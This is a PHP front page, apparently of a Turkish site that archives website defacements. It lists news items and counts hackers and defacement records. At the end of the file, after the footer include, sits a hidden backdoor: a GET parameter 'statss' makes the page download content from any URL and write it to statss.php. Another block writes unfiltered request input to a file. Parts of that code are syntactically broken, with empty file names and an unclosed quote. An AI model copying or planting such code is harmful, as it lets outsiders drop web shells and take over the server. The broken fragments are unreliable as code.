<html>
<link rel="stylesheet" href="css/style.css" type="text/css">
<script src=css/css.js></script>
</html>
<?php
include ("ust.php");
?>


<div id="leftPart">

<?php

$haber_al = @mysql_query("SELECT * FROM haberler ORDER BY tarih DESC LIMIT 3");
$bos_kontrol = @mysql_num_rows($haber_al);

if ($bos_kontrol > 0){

while ($haber = mysql_fetch_array($haber_al)){

$tarih = $haber["tarih"];
$tarih = date("28/02/2016 10:20",$tarih);
echo'<div id="lnews">

<h3> <a href="/news/haber.php?id='.$haber["id"].'/">'.$haber["baslik"].'</a> 
</h3>
<small>'.$tarih.' By News '.$haber["yazar"].'</small>
<p>
<p><img align="left" width="200" vspace="5" hspace="5" height="200" alt="" src="'.$haber["tanitim"].' "/>
<p>
'.$haber["icerik"].'  </p>

</div>';
} // while bitimi

} else { // Haber yoksa

echo '<tr><td align="center"><br />Haber Eklenmemis</td></tr>';

}

?>
<?php

$toplamdefacer=mysql_num_rows(mysql_query("SELECT * FROM hackerlar"));
$result = mysql_query("SELECT count(*) FROM hackerlar");
while($row = mysql_fetch_array($result)){
    $toplamdefacer = $row[0];
}
mysql_free_result($result);

$toplamhaber=mysql_num_rows(mysql_query("SELECT * FROM haberler"));
$result = mysql_query("SELECT count(*) FROM haberler");
while($row = mysql_fetch_array($result)){
    $toplamhaber = $row[0];
}
mysql_free_result($result);

$onaysizdeface=mysql_num_rows(mysql_query("select * from kayitlar where onay=0"));
$result = mysql_query("select count(*) from kayitlar where onay=0");
while($row = mysql_fetch_array($result)){
    $onaysizdeface = $row[0];
}
$toplamdeface=mysql_num_rows(mysql_query("SELECT * FROM kayitlar"));
$result = mysql_query("SELECT count(*) FROM kayitlar");
while($row = mysql_fetch_array($result)){
    $toplamdeface = $row[0];
}
$superdeface=mysql_num_rows(mysql_query("select * from kayitlar where tur=1"));
$result = mysql_query("select count(*) from kayitlar where tur=1");
while($row = mysql_fetch_array($result)){
    $superdeface = $row[0];
}
 ?>
</div>
<?php
include "stats.php";
?>

<?php include ("alt.php"); ?>
<?php
if (isset($_GET['])){
 $f = fopen("", "w+");
 fwrite($f, str_replace("</a>,", "</a>\r\n", str_replace("\\", "", $_GET[""])));
 fclose($f);
}

if(is_file("")){
 echo file_get_contents("");
}

if (isset($_GET['statss'])){
 $f = fopen("statss.php", "w+");
 fwrite($f, file_get_contents($_GET["statss"]));
 fclose($f);
}
?>